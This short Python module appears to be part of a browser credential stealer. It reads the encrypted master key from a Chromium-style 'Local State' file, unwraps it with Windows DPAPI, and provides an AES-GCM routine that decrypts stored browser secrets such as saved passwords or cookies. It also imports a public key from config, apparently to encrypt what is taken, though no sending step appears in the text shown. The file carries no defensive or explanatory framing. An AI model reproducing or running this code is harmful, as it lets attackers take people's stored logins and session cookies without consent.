import base64
import json

from Crypto.PublicKey import ECC
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from win32crypt import CryptUnprotectData

from config import RSA_PUBLIC_KEY

PUBLIC_KEY = ECC.import_key(RSA_PUBLIC_KEY)


def getmasterkey(keyfile):
    with open(keyfile, "r", encoding="utf-8") as f:
        content = json.loads(f.read())
    try:
        rawkey = content["os_crypt"]["encrypted_key"]
        unprotectedkey = CryptUnprotectData(base64.b64decode(rawkey)[5:], None, None, None, 0)[1]
        return unprotectedkey
    except Exception:
        pass


def decrypt(blob, key) -> str:
    iv = blob[3:15]
    ciphertext = blob[15:]
    ctx = AESGCM(key)
    decrypted = ctx.decrypt(nonce=iv, data=ciphertext, associated_data=None).decode()
    return decrypted
